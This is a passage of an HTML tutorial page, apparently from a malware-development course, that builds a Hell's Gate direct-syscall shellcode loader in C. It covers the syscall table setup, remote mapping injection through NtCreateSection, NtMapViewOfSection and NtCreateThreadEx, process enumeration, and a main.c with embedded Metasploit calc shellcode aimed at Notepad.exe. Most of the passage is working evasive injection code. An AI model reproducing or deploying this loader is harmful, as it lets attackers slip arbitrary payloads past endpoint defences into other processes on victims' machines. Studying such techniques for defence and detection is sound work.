+	VX_TABLE_ENTRY NtClose;
+	VX_TABLE_ENTRY NtCreateThreadEx;
+	VX_TABLE_ENTRY NtWaitForSingleObject;
+
+} VX_TABLE, * PVX_TABLE;</code></pre>
+        </div><h3 id="payload-injection-via-hell-s-gate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Payload Injection Via Hell's Gate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">With Hell&#x27;s Gate successfully set up, the payload injection implementation can be made. A new file will be created, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Inject.c</code> which is shown below.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following points briefly explain the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Inject.c</code> file:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> - This function initializes the global <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Sys</code> variable of type <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE</code> to be used later on.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code> - This function supports both local and remote mapping injection via the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">bLocal</code> parameter which is set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TRUE</code> to inject the payload locally, or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FALSE</code> for remote injection.<li style="list-style-type:circle">If the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">bLocal</code> parameter is set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TRUE</code>, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwLocalFlag</code> variable will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PAGE_EXECUTE_READWRITE</code> to be suitable for local payload execution, and the second <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtMapViewOfSection</code> will be avoided. But if <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">bLocal</code> is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FALSE</code>, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwLocalFlag</code> will remain <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PAGE_READWRITE</code> and the function will run the second <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtMapViewOfSection</code> call to allocate memory remotely.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pExecAddress</code> variable is used to save the base address of the injected payload. It is equal to the base address of the locally injected payload (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pLocalAddress</code>) if the function is set to execute the payload locally, or the remote injected payload base address (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pRemoteAddress</code>) if the function is set to execute the payload remotely.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pExecAddress</code> variable will be then passed to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateThreadEx</code> syscall to execute the payload whenever it was.</span></div></li><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Inject.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;Structs.h&quot;#include &quot;Common.h&quot;// global `VX_TABLE` structure
+VX_TABLE 	g_Sys = { 0 };
+
+
+
+BOOL InitializeSyscalls() {
+
+	// Get the PEB
+	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
+		return FALSE;
+
+	// Get NTDLL module
+	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
+
+	// Get the EAT of NTDLL
+	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
+		return FALSE;
+
+	g_Sys.NtCreateSection.uHash       = NtCreateSection_JOAA;
+	g_Sys.NtMapViewOfSection.uHash    = NtMapViewOfSection_JOAA;
+	g_Sys.NtUnmapViewOfSection.uHash  = NtUnmapViewOfSection_JOAA;
+	g_Sys.NtClose.uHash               = NtClose_JOAA;
+	g_Sys.NtCreateThreadEx.uHash      = NtCreateThreadEx_JOAA;
+	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
+
+	// initialize the syscalls
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
+		return FALSE;
+
+
+
+	return TRUE;
+}
+
+BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {
+
+        HANDLE          hSection          = NULL;
+        HANDLE          hThread           = NULL;
+        PVOID           pLocalAddress     = NULL,
+                        pRemoteAddress    = NULL,
+                        pExecAddress      = NULL;
+        NTSTATUS        STATUS            = NULL;
+        SIZE_T          sViewSize         = NULL;
+        LARGE_INTEGER   MaximumSize       = {
+              .HighPart = 0,
+              .LowPart = sPayloadSize
+        };
+
+        DWORD           dwLocalFlag       = PAGE_READWRITE;
+
+	//--------------------------------------------------------------------------
+    // Allocating local map view
+	HellsGate(g_Sys.NtCreateSection.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	if (bLocal) {
+		dwLocalFlag = PAGE_EXECUTE_READWRITE;
+	}
+
+	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);
+
+	//--------------------------------------------------------------------------
+    // Writing the payload
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pLocalAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);
+
+	//--------------------------------------------------------------------------
+        // Allocating remote map view
+        if (!bLocal) {
+
+          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
+          if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+            printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+            return FALSE;
+          }
+
+          printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);
+
+        }
+
+	//--------------------------------------------------------------------------
+    // Executing the payload via thread creation
+    pExecAddress = pRemoteAddress;
+	if (bLocal) {
+		pExecAddress = pLocalAddress;
+	}
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pExecAddress);
+	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+	//--------------------------------------------------------------------------
+    // Waiting for the thread to finish
+	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
+	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
+		printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Unmapping the local view
+	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+    // Closing the section handle
+	HellsGate(g_Sys.NtClose.wSystemCall);
+	if ((STATUS = HellDescent(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="process-enumeration" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Process Enumeration</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In order to create a complete process injection module, the usage of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtQuerySystemInformation</code> syscall is required to fetch a target process handle, as outlined in the <em>Process Enumeration - NtQuerySystemInformation</em> module.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The use of a new syscall will require the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE</code> structure to be updated to include one more element, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE_ENTRY NtQuerySystemInformation</code> for it to be initialized by the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> function. Additionally, use the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Hasher</code> program to calculate a hash value for the &quot;NtQuerySystemInformation&quot; string.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {
+
+	ULONG					    uReturnLen1 		= NULL,
+						        uReturnLen2 		= NULL;
+	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo 	= NULL;
+	PVOID					    pValueToFree 	= NULL;
+	NTSTATUS				    STATUS 			= NULL;
+
+	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that&#x27;s ok, because we need to know how much to allocate (uReturnLen1)
+	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
+	HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);
+
+	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL) {
+		return FALSE;
+	}
+
+	// Since we will modify &#x27;SystemProcInfo&#x27;, we will save its intial value before the while loop to free it later
+	pValueToFree = SystemProcInfo;
+
+	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to &#x27;SystemProcInfo&#x27;
+	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
+	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
+	if (STATUS != 0x0) {
+		printf(&quot;[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	while (TRUE) {
+
+		// Small check for the process&#x27;s name size
+		// Comparing the enumerated process name to what we want to target
+		if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
+			// Opening a handle to the target process and saving it, then breaking
+			*pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
+			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
+			break;
+		}
+
+		// If NextEntryOffset is 0, we reached the end of the array
+		if (!SystemProcInfo-&gt;NextEntryOffset)
+			break;
+
+		// Moving to the next element in the array
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
+	}
+
+	// Freeing using the initial address
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
+
+	// Checking if we got the target&#x27;s process handle
+	if (*pdwPid == NULL || *phProcess == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><h3 id="main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To test the code so far, create <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">main.c</code> which will contain the entry point function of the loader along with the usual Msfvenom calc payload.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following points briefly explain the main function:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> function is the first function to be called. All other functions depend on it to initialize the syscall structure.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>If <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TARGET_PROCESS</code> is defined, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetRemoteProcessHandle</code> is called to retrieve the target process handle and pass its output to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>If <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TARGET_PROCESS</code> is not defined, the code directly calls <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code> with a pseudo value to the local process handle (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">1</code>), instructing it to inject the payload locally.</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>main.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;Structs.h&quot;#include &quot;Common.h&quot;// comment to inject to the local process
+//
+#define TARGET_PROCESS	L&quot;Notepad.exe&quot;// x64 calc metasploit
+unsigned char Payload [] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+
+
+int main() {
+
+	DWORD		dwProcessId		= NULL;
+	HANDLE		hProcess		= NULL;
+
+
+	if (!InitializeSyscalls()) {
+		printf(&quot;[!] Failed To Initialize Syscalls Structure \n&quot;);
+		return -1;
+	}
+
+
+#ifdef TARGET_PROCESSwprintf(L&quot;[i] Targetting Remote Process %s ... \n&quot;, TARGET_PROCESS);
+	if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwProcessId, &amp;hProcess)) {
+		printf(&quot;[!] Could Not Find Target Process Id \n&quot;);
+		return -1;
+	}
+	printf(&quot;[+] Target Process Id Detected Of PID : %d \n&quot;, dwProcessId);
+
+	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), FALSE)) {
+		printf(&quot;[!] Failed To Inject Payload \n&quot;);
+		return -1;
+	}
+
+
+#endif // TARGET_PROCESS#ifndef TARGET_PROCESSif (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
+		printf(&quot;[!] Failed To Inject Payload \n&quot;);
+		return -1;
+	}
+
+#endif // !TARGET_POCESSreturn 0;
+}</code></pre>
